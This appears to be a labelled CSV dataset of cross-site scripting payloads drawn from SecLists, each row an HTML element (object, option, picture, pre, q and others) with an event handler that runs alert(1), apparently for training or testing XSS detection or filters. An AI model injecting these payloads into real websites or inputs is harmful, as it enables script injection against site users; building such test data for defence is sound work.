payload,label,source
"<object onbeforecut=""alert(1)"" contenteditable>test</object>",xss,seclists
"<object onbeforepaste=""alert(1)"" contenteditable>test</object>",xss,seclists
<object onblur=alert(1) tabindex=1 id=x></object><input autofocus>,xss,seclists
"<object onclick=""alert(1)"">test</object>",xss,seclists
"<object oncontextmenu=""alert(1)"">test</object>",xss,seclists
"<object oncopy=""alert(1)"" contenteditable>test</object>",xss,seclists
"<object oncut=""alert(1)"" contenteditable>test</object>",xss,seclists
"<object ondblclick=""alert(1)"">test</object>",xss,seclists
<object onerror=alert(1) data=1 type=image/gif>,xss,seclists
<object onfocusout=alert(1) tabindex=1 id=x></object><input autofocus>,xss,seclists
"<object onkeydown=""alert(1)"" contenteditable>test</object>",xss,seclists
"<object onkeypress=""alert(1)"" contenteditable>test</object>",xss,seclists
"<object onkeyup=""alert(1)"" contenteditable>test</object>",xss,seclists
"<object onmousedown=""alert(1)"">test</object>",xss,seclists
"<object onmouseenter=""alert(1)"">test</object>",xss,seclists
"<object onmouseleave=""alert(1)"">test</object>",xss,seclists
"<object onmousemove=""alert(1)"">test</object>",xss,seclists
"<object onmouseout=""alert(1)"">test</object>",xss,seclists
"<object onmouseover=""alert(1)"">test</object>",xss,seclists
"<object onmouseup=""alert(1)"">test</object>",xss,seclists
"<object onpaste=""alert(1)"" contenteditable>test</object>",xss,seclists
"<ol draggable=""true"" ondrag=""alert(1)"">test</ol>",xss,seclists
"<ol draggable=""true"" ondragend=""alert(1)"">test</ol>",xss,seclists
"<ol draggable=""true"" ondragenter=""alert(1)"">test</ol>",xss,seclists
"<ol draggable=""true"" ondragleave=""alert(1)"">test</ol>",xss,seclists
"<ol draggable=""true"" ondragstart=""alert(1)"">test</ol>",xss,seclists
<ol id=x tabindex=1 onactivate=alert(1)></ol>,xss,seclists
<ol id=x tabindex=1 onbeforeactivate=alert(1)></ol>,xss,seclists
<ol id=x tabindex=1 onbeforedeactivate=alert(1)></ol><input autofocus>,xss,seclists
<ol id=x tabindex=1 ondeactivate=alert(1)></ol><input id=y autofocus>,xss,seclists
<ol id=x tabindex=1 onfocus=alert(1)></ol>,xss,seclists
<ol id=x tabindex=1 onfocusin=alert(1)></ol>,xss,seclists
"<ol onbeforecopy=""alert(1)"" contenteditable>test</ol>",xss,seclists
"<ol onbeforecut=""alert(1)"" contenteditable>test</ol>",xss,seclists
"<ol onbeforepaste=""alert(1)"" contenteditable>test</ol>",xss,seclists
<ol onblur=alert(1) tabindex=1 id=x></ol><input autofocus>,xss,seclists
"<ol onclick=""alert(1)"">test</ol>",xss,seclists
"<ol oncontextmenu=""alert(1)"">test</ol>",xss,seclists
"<ol oncopy=""alert(1)"" contenteditable>test</ol>",xss,seclists
"<ol oncut=""alert(1)"" contenteditable>test</ol>",xss,seclists
"<ol ondblclick=""alert(1)"">test</ol>",xss,seclists
<ol onfocusout=alert(1) tabindex=1 id=x></ol><input autofocus>,xss,seclists
"<ol onkeydown=""alert(1)"" contenteditable>test</ol>",xss,seclists
"<ol onkeypress=""alert(1)"" contenteditable>test</ol>",xss,seclists
"<ol onkeyup=""alert(1)"" contenteditable>test</ol>",xss,seclists
"<ol onmousedown=""alert(1)"">test</ol>",xss,seclists
"<ol onmouseenter=""alert(1)"">test</ol>",xss,seclists
"<ol onmouseleave=""alert(1)"">test</ol>",xss,seclists
"<ol onmousemove=""alert(1)"">test</ol>",xss,seclists
"<ol onmouseout=""alert(1)"">test</ol>",xss,seclists
"<ol onmouseover=""alert(1)"">test</ol>",xss,seclists
"<ol onmouseup=""alert(1)"">test</ol>",xss,seclists
"<ol onpaste=""alert(1)"" contenteditable>test</ol>",xss,seclists
"<optgroup draggable=""true"" ondrag=""alert(1)"">test</optgroup>",xss,seclists
"<optgroup draggable=""true"" ondragend=""alert(1)"">test</optgroup>",xss,seclists
"<optgroup draggable=""true"" ondragenter=""alert(1)"">test</optgroup>",xss,seclists
"<optgroup draggable=""true"" ondragleave=""alert(1)"">test</optgroup>",xss,seclists
"<optgroup draggable=""true"" ondragstart=""alert(1)"">test</optgroup>",xss,seclists
<optgroup id=x tabindex=1 onactivate=alert(1)></optgroup>,xss,seclists
<optgroup id=x tabindex=1 onbeforeactivate=alert(1)></optgroup>,xss,seclists
<optgroup id=x tabindex=1 onbeforedeactivate=alert(1)></optgroup><input autofocus>,xss,seclists
<optgroup id=x tabindex=1 ondeactivate=alert(1)></optgroup><input id=y autofocus>,xss,seclists
<optgroup id=x tabindex=1 onfocus=alert(1)></optgroup>,xss,seclists
<optgroup id=x tabindex=1 onfocusin=alert(1)></optgroup>,xss,seclists
"<optgroup onbeforecopy=""alert(1)"" contenteditable>test</optgroup>",xss,seclists
"<optgroup onbeforecut=""alert(1)"" contenteditable>test</optgroup>",xss,seclists
"<optgroup onbeforepaste=""alert(1)"" contenteditable>test</optgroup>",xss,seclists
<optgroup onblur=alert(1) tabindex=1 id=x></optgroup><input autofocus>,xss,seclists
"<optgroup onclick=""alert(1)"">test</optgroup>",xss,seclists
"<optgroup oncontextmenu=""alert(1)"">test</optgroup>",xss,seclists
"<optgroup oncopy=""alert(1)"" contenteditable>test</optgroup>",xss,seclists
"<optgroup oncut=""alert(1)"" contenteditable>test</optgroup>",xss,seclists
"<optgroup ondblclick=""alert(1)"">test</optgroup>",xss,seclists
<optgroup onfocusout=alert(1) tabindex=1 id=x></optgroup><input autofocus>,xss,seclists
"<optgroup onkeydown=""alert(1)"" contenteditable>test</optgroup>",xss,seclists
"<optgroup onkeypress=""alert(1)"" contenteditable>test</optgroup>",xss,seclists
"<optgroup onkeyup=""alert(1)"" contenteditable>test</optgroup>",xss,seclists
"<optgroup onmousedown=""alert(1)"">test</optgroup>",xss,seclists
"<optgroup onmouseenter=""alert(1)"">test</optgroup>",xss,seclists
"<optgroup onmouseleave=""alert(1)"">test</optgroup>",xss,seclists
"<optgroup onmousemove=""alert(1)"">test</optgroup>",xss,seclists
"<optgroup onmouseout=""alert(1)"">test</optgroup>",xss,seclists
"<optgroup onmouseover=""alert(1)"">test</optgroup>",xss,seclists
"<optgroup onmouseup=""alert(1)"">test</optgroup>",xss,seclists
"<optgroup onpaste=""alert(1)"" contenteditable>test</optgroup>",xss,seclists
"<option draggable=""true"" ondrag=""alert(1)"">test</option>",xss,seclists
"<option draggable=""true"" ondragend=""alert(1)"">test</option>",xss,seclists
"<option draggable=""true"" ondragenter=""alert(1)"">test</option>",xss,seclists
"<option draggable=""true"" ondragleave=""alert(1)"">test</option>",xss,seclists
"<option draggable=""true"" ondragstart=""alert(1)"">test</option>",xss,seclists
<option id=x tabindex=1 onactivate=alert(1)></option>,xss,seclists
<option id=x tabindex=1 onbeforeactivate=alert(1)></option>,xss,seclists
<option id=x tabindex=1 onbeforedeactivate=alert(1)></option><input autofocus>,xss,seclists
<option id=x tabindex=1 ondeactivate=alert(1)></option><input id=y autofocus>,xss,seclists
<option id=x tabindex=1 onfocus=alert(1)></option>,xss,seclists
<option id=x tabindex=1 onfocusin=alert(1)></option>,xss,seclists
"<option onbeforecopy=""alert(1)"" contenteditable>test</option>",xss,seclists
"<option onbeforecut=""alert(1)"" contenteditable>test</option>",xss,seclists
"<option onbeforepaste=""alert(1)"" contenteditable>test</option>",xss,seclists
<option onblur=alert(1) tabindex=1 id=x></option><input autofocus>,xss,seclists
"<option onclick=""alert(1)"">test</option>",xss,seclists
"<option oncontextmenu=""alert(1)"">test</option>",xss,seclists
"<option oncopy=""alert(1)"" contenteditable>test</option>",xss,seclists
"<option oncut=""alert(1)"" contenteditable>test</option>",xss,seclists
"<option ondblclick=""alert(1)"">test</option>",xss,seclists
<option onfocusout=alert(1) tabindex=1 id=x></option><input autofocus>,xss,seclists
"<option onkeydown=""alert(1)"" contenteditable>test</option>",xss,seclists
"<option onkeypress=""alert(1)"" contenteditable>test</option>",xss,seclists
"<option onkeyup=""alert(1)"" contenteditable>test</option>",xss,seclists
"<option onmousedown=""alert(1)"">test</option>",xss,seclists
"<option onmouseenter=""alert(1)"">test</option>",xss,seclists
"<option onmouseleave=""alert(1)"">test</option>",xss,seclists
"<option onmousemove=""alert(1)"">test</option>",xss,seclists
"<option onmouseout=""alert(1)"">test</option>",xss,seclists
"<option onmouseover=""alert(1)"">test</option>",xss,seclists
"<option onmouseup=""alert(1)"">test</option>",xss,seclists
"<option onpaste=""alert(1)"" contenteditable>test</option>",xss,seclists
"<output draggable=""true"" ondrag=""alert(1)"">test</output>",xss,seclists
"<output draggable=""true"" ondragend=""alert(1)"">test</output>",xss,seclists
"<output draggable=""true"" ondragenter=""alert(1)"">test</output>",xss,seclists
"<output draggable=""true"" ondragleave=""alert(1)"">test</output>",xss,seclists
"<output draggable=""true"" ondragstart=""alert(1)"">test</output>",xss,seclists
<output id=x tabindex=1 onactivate=alert(1)></output>,xss,seclists
<output id=x tabindex=1 onbeforeactivate=alert(1)></output>,xss,seclists
<output id=x tabindex=1 onbeforedeactivate=alert(1)></output><input autofocus>,xss,seclists
<output id=x tabindex=1 ondeactivate=alert(1)></output><input id=y autofocus>,xss,seclists
<output id=x tabindex=1 onfocus=alert(1)></output>,xss,seclists
<output id=x tabindex=1 onfocusin=alert(1)></output>,xss,seclists
"<output onbeforecopy=""alert(1)"" contenteditable>test</output>",xss,seclists
"<output onbeforecut=""alert(1)"" contenteditable>test</output>",xss,seclists
"<output onbeforepaste=""alert(1)"" contenteditable>test</output>",xss,seclists
<output onblur=alert(1) tabindex=1 id=x></output><input autofocus>,xss,seclists
"<output onclick=""alert(1)"">test</output>",xss,seclists
"<output oncontextmenu=""alert(1)"">test</output>",xss,seclists
"<output oncopy=""alert(1)"" contenteditable>test</output>",xss,seclists
"<output oncut=""alert(1)"" contenteditable>test</output>",xss,seclists
"<output ondblclick=""alert(1)"">test</output>",xss,seclists
<output onfocusout=alert(1) tabindex=1 id=x></output><input autofocus>,xss,seclists
"<output onkeydown=""alert(1)"" contenteditable>test</output>",xss,seclists
"<output onkeypress=""alert(1)"" contenteditable>test</output>",xss,seclists
"<output onkeyup=""alert(1)"" contenteditable>test</output>",xss,seclists
"<output onmousedown=""alert(1)"">test</output>",xss,seclists
"<output onmouseenter=""alert(1)"">test</output>",xss,seclists
"<output onmouseleave=""alert(1)"">test</output>",xss,seclists
"<output onmousemove=""alert(1)"">test</output>",xss,seclists
"<output onmouseout=""alert(1)"">test</output>",xss,seclists
"<output onmouseover=""alert(1)"">test</output>",xss,seclists
"<output onmouseup=""alert(1)"">test</output>",xss,seclists
"<output onpaste=""alert(1)"" contenteditable>test</output>",xss,seclists
"<p draggable=""true"" ondrag=""alert(1)"">test</p>",xss,seclists
"<p draggable=""true"" ondragend=""alert(1)"">test</p>",xss,seclists
"<p draggable=""true"" ondragenter=""alert(1)"">test</p>",xss,seclists
"<p draggable=""true"" ondragleave=""alert(1)"">test</p>",xss,seclists
"<p draggable=""true"" ondragstart=""alert(1)"">test</p>",xss,seclists
<p id=x tabindex=1 onactivate=alert(1)></p>,xss,seclists
<p id=x tabindex=1 onbeforeactivate=alert(1)></p>,xss,seclists
<p id=x tabindex=1 onbeforedeactivate=alert(1)></p><input autofocus>,xss,seclists
<p id=x tabindex=1 ondeactivate=alert(1)></p><input id=y autofocus>,xss,seclists
<p id=x tabindex=1 onfocus=alert(1)></p>,xss,seclists
<p id=x tabindex=1 onfocusin=alert(1)></p>,xss,seclists
"<p onbeforecopy=""alert(1)"" contenteditable>test</p>",xss,seclists
"<p onbeforecut=""alert(1)"" contenteditable>test</p>",xss,seclists
"<p onbeforepaste=""alert(1)"" contenteditable>test</p>",xss,seclists
<p onblur=alert(1) tabindex=1 id=x></p><input autofocus>,xss,seclists
"<p onclick=""alert(1)"">test</p>",xss,seclists
"<p oncontextmenu=""alert(1)"">test</p>",xss,seclists
"<p oncopy=""alert(1)"" contenteditable>test</p>",xss,seclists
"<p oncut=""alert(1)"" contenteditable>test</p>",xss,seclists
"<p ondblclick=""alert(1)"">test</p>",xss,seclists
<p onfocusout=alert(1) tabindex=1 id=x></p><input autofocus>,xss,seclists
"<p onkeydown=""alert(1)"" contenteditable>test</p>",xss,seclists
"<p onkeypress=""alert(1)"" contenteditable>test</p>",xss,seclists
"<p onkeyup=""alert(1)"" contenteditable>test</p>",xss,seclists
"<p onmousedown=""alert(1)"">test</p>",xss,seclists
"<p onmouseenter=""alert(1)"">test</p>",xss,seclists
"<p onmouseleave=""alert(1)"">test</p>",xss,seclists
"<p onmousemove=""alert(1)"">test</p>",xss,seclists
"<p onmouseout=""alert(1)"">test</p>",xss,seclists
"<p onmouseover=""alert(1)"">test</p>",xss,seclists
"<p onmouseup=""alert(1)"">test</p>",xss,seclists
"<p onpaste=""alert(1)"" contenteditable>test</p>",xss,seclists
"<param draggable=""true"" ondrag=""alert(1)"">test</param>",xss,seclists
"<param draggable=""true"" ondragend=""alert(1)"">test</param>",xss,seclists
"<param draggable=""true"" ondragenter=""alert(1)"">test</param>",xss,seclists
"<param draggable=""true"" ondragleave=""alert(1)"">test</param>",xss,seclists
"<param draggable=""true"" ondragstart=""alert(1)"">test</param>",xss,seclists
<param id=x tabindex=1 onactivate=alert(1)></param>,xss,seclists
<param id=x tabindex=1 onbeforeactivate=alert(1)></param>,xss,seclists
<param id=x tabindex=1 onbeforedeactivate=alert(1)></param><input autofocus>,xss,seclists
<param id=x tabindex=1 ondeactivate=alert(1)></param><input id=y autofocus>,xss,seclists
<param id=x tabindex=1 onfocus=alert(1)></param>,xss,seclists
<param id=x tabindex=1 onfocusin=alert(1)></param>,xss,seclists
"<param onbeforecopy=""alert(1)"" contenteditable>test</param>",xss,seclists
"<param onbeforecut=""alert(1)"" contenteditable>test</param>",xss,seclists
"<param onbeforepaste=""alert(1)"" contenteditable>test</param>",xss,seclists
<param onblur=alert(1) tabindex=1 id=x></param><input autofocus>,xss,seclists
"<param onclick=""alert(1)"">test</param>",xss,seclists
"<param oncontextmenu=""alert(1)"">test</param>",xss,seclists
"<param oncopy=""alert(1)"" contenteditable>test</param>",xss,seclists
"<param oncut=""alert(1)"" contenteditable>test</param>",xss,seclists
"<param ondblclick=""alert(1)"">test</param>",xss,seclists
<param onfocusout=alert(1) tabindex=1 id=x></param><input autofocus>,xss,seclists
"<param onkeydown=""alert(1)"" contenteditable>test</param>",xss,seclists
"<param onkeypress=""alert(1)"" contenteditable>test</param>",xss,seclists
"<param onkeyup=""alert(1)"" contenteditable>test</param>",xss,seclists
"<param onmousedown=""alert(1)"">test</param>",xss,seclists
"<param onmouseenter=""alert(1)"">test</param>",xss,seclists
"<param onmouseleave=""alert(1)"">test</param>",xss,seclists
"<param onmousemove=""alert(1)"">test</param>",xss,seclists
"<param onmouseout=""alert(1)"">test</param>",xss,seclists
"<param onmouseover=""alert(1)"">test</param>",xss,seclists
"<param onmouseup=""alert(1)"">test</param>",xss,seclists
"<param onpaste=""alert(1)"" contenteditable>test</param>",xss,seclists
"<picture draggable=""true"" ondrag=""alert(1)"">test</picture>",xss,seclists
"<picture draggable=""true"" ondragend=""alert(1)"">test</picture>",xss,seclists
"<picture draggable=""true"" ondragenter=""alert(1)"">test</picture>",xss,seclists
"<picture draggable=""true"" ondragleave=""alert(1)"">test</picture>",xss,seclists
"<picture draggable=""true"" ondragstart=""alert(1)"">test</picture>",xss,seclists
<picture id=x tabindex=1 onactivate=alert(1)></picture>,xss,seclists
<picture id=x tabindex=1 onbeforeactivate=alert(1)></picture>,xss,seclists
<picture id=x tabindex=1 onbeforedeactivate=alert(1)></picture><input autofocus>,xss,seclists
<picture id=x tabindex=1 ondeactivate=alert(1)></picture><input id=y autofocus>,xss,seclists
<picture id=x tabindex=1 onfocus=alert(1)></picture>,xss,seclists
<picture id=x tabindex=1 onfocusin=alert(1)></picture>,xss,seclists
"<picture onbeforecopy=""alert(1)"" contenteditable>test</picture>",xss,seclists
"<picture onbeforecut=""alert(1)"" contenteditable>test</picture>",xss,seclists
"<picture onbeforepaste=""alert(1)"" contenteditable>test</picture>",xss,seclists
<picture onblur=alert(1) tabindex=1 id=x></picture><input autofocus>,xss,seclists
"<picture onclick=""alert(1)"">test</picture>",xss,seclists
"<picture oncontextmenu=""alert(1)"">test</picture>",xss,seclists
"<picture oncopy=""alert(1)"" contenteditable>test</picture>",xss,seclists
"<picture oncut=""alert(1)"" contenteditable>test</picture>",xss,seclists
"<picture ondblclick=""alert(1)"">test</picture>",xss,seclists
<picture onfocusout=alert(1) tabindex=1 id=x></picture><input autofocus>,xss,seclists
"<picture onkeydown=""alert(1)"" contenteditable>test</picture>",xss,seclists
"<picture onkeypress=""alert(1)"" contenteditable>test</picture>",xss,seclists
"<picture onkeyup=""alert(1)"" contenteditable>test</picture>",xss,seclists
"<picture onmousedown=""alert(1)"">test</picture>",xss,seclists
"<picture onmouseenter=""alert(1)"">test</picture>",xss,seclists
"<picture onmouseleave=""alert(1)"">test</picture>",xss,seclists
"<picture onmousemove=""alert(1)"">test</picture>",xss,seclists
"<picture onmouseout=""alert(1)"">test</picture>",xss,seclists
"<picture onmouseover=""alert(1)"">test</picture>",xss,seclists
"<picture onmouseup=""alert(1)"">test</picture>",xss,seclists
"<picture onpaste=""alert(1)"" contenteditable>test</picture>",xss,seclists
"<picture><source srcset=""validimage.png""><image onload=alert(1)></picture>",xss,seclists
"<picture><source srcset=""validimage.png""><image onloadend=alert(1)></picture>",xss,seclists
"<picture><source srcset=""validimage.png""><image onloadstart=alert(1)></picture>",xss,seclists
"<picture><source srcset=""validimage.png""><img onload=alert(1)></picture>",xss,seclists
"<picture><source srcset=""validimage.png""><img onloadend=alert(1)></picture>",xss,seclists
"<picture><source srcset=""validimage.png""><img onloadstart=alert(1)></picture>",xss,seclists
"<plaintext draggable=""true"" ondrag=""alert(1)"">test</plaintext>",xss,seclists
"<plaintext draggable=""true"" ondragend=""alert(1)"">test</plaintext>",xss,seclists
"<plaintext draggable=""true"" ondragenter=""alert(1)"">test</plaintext>",xss,seclists
"<plaintext draggable=""true"" ondragleave=""alert(1)"">test</plaintext>",xss,seclists
"<plaintext draggable=""true"" ondragstart=""alert(1)"">test</plaintext>",xss,seclists
<plaintext id=x tabindex=1 onactivate=alert(1)></plaintext>,xss,seclists
<plaintext id=x tabindex=1 onbeforeactivate=alert(1)></plaintext>,xss,seclists
<plaintext id=x tabindex=1 onbeforedeactivate=alert(1)></plaintext><input autofocus>,xss,seclists
<plaintext id=x tabindex=1 ondeactivate=alert(1)></plaintext><input id=y autofocus>,xss,seclists
<plaintext id=x tabindex=1 onfocus=alert(1)></plaintext>,xss,seclists
<plaintext id=x tabindex=1 onfocusin=alert(1)></plaintext>,xss,seclists
"<plaintext onbeforecopy=""alert(1)"" contenteditable>test</plaintext>",xss,seclists
"<plaintext onbeforecut=""alert(1)"" contenteditable>test</plaintext>",xss,seclists
"<plaintext onbeforepaste=""alert(1)"" contenteditable>test</plaintext>",xss,seclists
<plaintext onblur=alert(1) tabindex=1 id=x></plaintext><input autofocus>,xss,seclists
"<plaintext onclick=""alert(1)"">test</plaintext>",xss,seclists
"<plaintext oncontextmenu=""alert(1)"">test</plaintext>",xss,seclists
"<plaintext oncopy=""alert(1)"" contenteditable>test</plaintext>",xss,seclists
"<plaintext oncut=""alert(1)"" contenteditable>test</plaintext>",xss,seclists
"<plaintext ondblclick=""alert(1)"">test</plaintext>",xss,seclists
<plaintext onfocusout=alert(1) tabindex=1 id=x></plaintext><input autofocus>,xss,seclists
"<plaintext onkeydown=""alert(1)"" contenteditable>test</plaintext>",xss,seclists
"<plaintext onkeypress=""alert(1)"" contenteditable>test</plaintext>",xss,seclists
"<plaintext onkeyup=""alert(1)"" contenteditable>test</plaintext>",xss,seclists
"<plaintext onmousedown=""alert(1)"">test</plaintext>",xss,seclists
"<plaintext onmouseenter=""alert(1)"">test</plaintext>",xss,seclists
"<plaintext onmouseleave=""alert(1)"">test</plaintext>",xss,seclists
"<plaintext onmousemove=""alert(1)"">test</plaintext>",xss,seclists
"<plaintext onmouseout=""alert(1)"">test</plaintext>",xss,seclists
"<plaintext onmouseover=""alert(1)"">test</plaintext>",xss,seclists
"<plaintext onmouseup=""alert(1)"">test</plaintext>",xss,seclists
"<plaintext onpaste=""alert(1)"" contenteditable>test</plaintext>",xss,seclists
"<pre draggable=""true"" ondrag=""alert(1)"">test</pre>",xss,seclists
"<pre draggable=""true"" ondragend=""alert(1)"">test</pre>",xss,seclists
"<pre draggable=""true"" ondragenter=""alert(1)"">test</pre>",xss,seclists
"<pre draggable=""true"" ondragleave=""alert(1)"">test</pre>",xss,seclists
"<pre draggable=""true"" ondragstart=""alert(1)"">test</pre>",xss,seclists
<pre id=x tabindex=1 onactivate=alert(1)></pre>,xss,seclists
<pre id=x tabindex=1 onbeforeactivate=alert(1)></pre>,xss,seclists
<pre id=x tabindex=1 onbeforedeactivate=alert(1)></pre><input autofocus>,xss,seclists
<pre id=x tabindex=1 ondeactivate=alert(1)></pre><input id=y autofocus>,xss,seclists
<pre id=x tabindex=1 onfocus=alert(1)></pre>,xss,seclists
<pre id=x tabindex=1 onfocusin=alert(1)></pre>,xss,seclists
"<pre onbeforecopy=""alert(1)"" contenteditable>test</pre>",xss,seclists
"<pre onbeforecut=""alert(1)"" contenteditable>test</pre>",xss,seclists
"<pre onbeforepaste=""alert(1)"" contenteditable>test</pre>",xss,seclists
<pre onblur=alert(1) tabindex=1 id=x></pre><input autofocus>,xss,seclists
"<pre onclick=""alert(1)"">test</pre>",xss,seclists
"<pre oncontextmenu=""alert(1)"">test</pre>",xss,seclists
"<pre oncopy=""alert(1)"" contenteditable>test</pre>",xss,seclists
"<pre oncut=""alert(1)"" contenteditable>test</pre>",xss,seclists
"<pre ondblclick=""alert(1)"">test</pre>",xss,seclists
<pre onfocusout=alert(1) tabindex=1 id=x></pre><input autofocus>,xss,seclists
"<pre onkeydown=""alert(1)"" contenteditable>test</pre>",xss,seclists
"<pre onkeypress=""alert(1)"" contenteditable>test</pre>",xss,seclists
"<pre onkeyup=""alert(1)"" contenteditable>test</pre>",xss,seclists
"<pre onmousedown=""alert(1)"">test</pre>",xss,seclists
"<pre onmouseenter=""alert(1)"">test</pre>",xss,seclists
"<pre onmouseleave=""alert(1)"">test</pre>",xss,seclists
"<pre onmousemove=""alert(1)"">test</pre>",xss,seclists
"<pre onmouseout=""alert(1)"">test</pre>",xss,seclists
"<pre onmouseover=""alert(1)"">test</pre>",xss,seclists
"<pre onmouseup=""alert(1)"">test</pre>",xss,seclists
"<pre onpaste=""alert(1)"" contenteditable>test</pre>",xss,seclists
"<progress draggable=""true"" ondrag=""alert(1)"">test</progress>",xss,seclists
"<progress draggable=""true"" ondragend=""alert(1)"">test</progress>",xss,seclists
"<progress draggable=""true"" ondragenter=""alert(1)"">test</progress>",xss,seclists
"<progress draggable=""true"" ondragleave=""alert(1)"">test</progress>",xss,seclists
"<progress draggable=""true"" ondragstart=""alert(1)"">test</progress>",xss,seclists
<progress id=x tabindex=1 onactivate=alert(1)></progress>,xss,seclists
<progress id=x tabindex=1 onbeforeactivate=alert(1)></progress>,xss,seclists
<progress id=x tabindex=1 onbeforedeactivate=alert(1)></progress><input autofocus>,xss,seclists
<progress id=x tabindex=1 ondeactivate=alert(1)></progress><input id=y autofocus>,xss,seclists
<progress id=x tabindex=1 onfocus=alert(1)></progress>,xss,seclists
<progress id=x tabindex=1 onfocusin=alert(1)></progress>,xss,seclists
"<progress onbeforecopy=""alert(1)"" contenteditable>test</progress>",xss,seclists
"<progress onbeforecut=""alert(1)"" contenteditable>test</progress>",xss,seclists
"<progress onbeforepaste=""alert(1)"" contenteditable>test</progress>",xss,seclists
<progress onblur=alert(1) tabindex=1 id=x></progress><input autofocus>,xss,seclists
"<progress onclick=""alert(1)"">test</progress>",xss,seclists
"<progress oncontextmenu=""alert(1)"">test</progress>",xss,seclists
"<progress oncopy=""alert(1)"" contenteditable>test</progress>",xss,seclists
"<progress oncut=""alert(1)"" contenteditable>test</progress>",xss,seclists
"<progress ondblclick=""alert(1)"">test</progress>",xss,seclists
<progress onfocusout=alert(1) tabindex=1 id=x></progress><input autofocus>,xss,seclists
"<progress onkeydown=""alert(1)"" contenteditable>test</progress>",xss,seclists
"<progress onkeypress=""alert(1)"" contenteditable>test</progress>",xss,seclists
"<progress onkeyup=""alert(1)"" contenteditable>test</progress>",xss,seclists
"<progress onmousedown=""alert(1)"">test</progress>",xss,seclists
"<progress onmouseenter=""alert(1)"">test</progress>",xss,seclists
"<progress onmouseleave=""alert(1)"">test</progress>",xss,seclists
"<progress onmousemove=""alert(1)"">test</progress>",xss,seclists
"<progress onmouseout=""alert(1)"">test</progress>",xss,seclists
"<progress onmouseover=""alert(1)"">test</progress>",xss,seclists
"<progress onmouseup=""alert(1)"">test</progress>",xss,seclists
"<progress onpaste=""alert(1)"" contenteditable>test</progress>",xss,seclists
"<q draggable=""true"" ondrag=""alert(1)"">test</q>",xss,seclists
"<q draggable=""true"" ondragend=""alert(1)"">test</q>",xss,seclists
"<q draggable=""true"" ondragenter=""alert(1)"">test</q>",xss,seclists
"<q draggable=""true"" ondragleave=""alert(1)"">test</q>",xss,seclists
"<q draggable=""true"" ondragstart=""alert(1)"">test</q>",xss,seclists
<q id=x tabindex=1 onactivate=alert(1)></q>,xss,seclists
<q id=x tabindex=1 onbeforeactivate=alert(1)></q>,xss,seclists
<q id=x tabindex=1 onbeforedeactivate=alert(1)></q><input autofocus>,xss,seclists
<q id=x tabindex=1 ondeactivate=alert(1)></q><input id=y autofocus>,xss,seclists
<q id=x tabindex=1 onfocus=alert(1)></q>,xss,seclists
<q id=x tabindex=1 onfocusin=alert(1)></q>,xss,seclists
"<q onbeforecopy=""alert(1)"" contenteditable>test</q>",xss,seclists
"<q onbeforecut=""alert(1)"" contenteditable>test</q>",xss,seclists
"<q onbeforepaste=""alert(1)"" contenteditable>test</q>",xss,seclists
<q onblur=alert(1) tabindex=1 id=x></q><input autofocus>,xss,seclists
"<q onclick=""alert(1)"">test</q>",xss,seclists
"<q oncontextmenu=""alert(1)"">test</q>",xss,seclists
"<q oncopy=""alert(1)"" contenteditable>test</q>",xss,seclists
"<q oncut=""alert(1)"" contenteditable>test</q>",xss,seclists
"<q ondblclick=""alert(1)"">test</q>",xss,seclists
<q onfocusout=alert(1) tabindex=1 id=x></q><input autofocus>,xss,seclists
"<q onkeydown=""alert(1)"" contenteditable>test</q>",xss,seclists
"<q onkeypress=""alert(1)"" contenteditable>test</q>",xss,seclists
"<q onkeyup=""alert(1)"" contenteditable>test</q>",xss,seclists
"<q onmousedown=""alert(1)"">test</q>",xss,seclists
"<q onmouseenter=""alert(1)"">test</q>",xss,seclists
"<q onmouseleave=""alert(1)"">test</q>",xss,seclists
"<q onmousemove=""alert(1)"">test</q>",xss,seclists
"<q onmouseout=""alert(1)"">test</q>",xss,seclists
"<q onmouseover=""alert(1)"">test</q>",xss,seclists
"<q onmouseup=""alert(1)"">test</q>",xss,seclists
"<q onpaste=""alert(1)"" contenteditable>test</q>",xss,seclists
"<rb draggable=""true"" ondrag=""alert(1)"">test</rb>",xss,seclists
"<rb draggable=""true"" ondragend=""alert(1)"">test</rb>",xss,seclists
"<rb draggable=""true"" ondragenter=""alert(1)"">test</rb>",xss,seclists
"<rb draggable=""true"" ondragleave=""alert(1)"">test</rb>",xss,seclists
"<rb draggable=""true"" ondragstart=""alert(1)"">test</rb>",xss,seclists
<rb id=x tabindex=1 onactivate=alert(1)></rb>,xss,seclists
<rb id=x tabindex=1 onbeforeactivate=alert(1)></rb>,xss,seclists
<rb id=x tabindex=1 onbeforedeactivate=alert(1)></rb><input autofocus>,xss,seclists
<rb id=x tabindex=1 ondeactivate=alert(1)></rb><input id=y autofocus>,xss,seclists
<rb id=x tabindex=1 onfocus=alert(1)></rb>,xss,seclists
